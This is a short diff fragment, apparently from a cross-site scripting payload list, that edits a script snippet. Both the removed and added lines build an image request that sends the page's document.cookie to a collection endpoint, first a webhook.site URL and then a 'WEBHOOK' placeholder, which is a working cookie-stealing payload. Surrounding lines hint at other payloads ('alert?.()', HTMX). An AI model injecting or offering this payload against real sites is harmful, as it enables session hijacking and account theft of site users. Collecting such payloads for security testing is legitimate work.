@@ -8,7 +8,7 @@ alert?.()
 
 <script>
 var i=new Image;
-i.src="https://webhook.site/ad393518-0802-4745-a72a-63d01a39f3f6/?"+document.cookie;
+i.src="WEBHOOK/?"+document.cookie;
 </script>
 
 HTMX
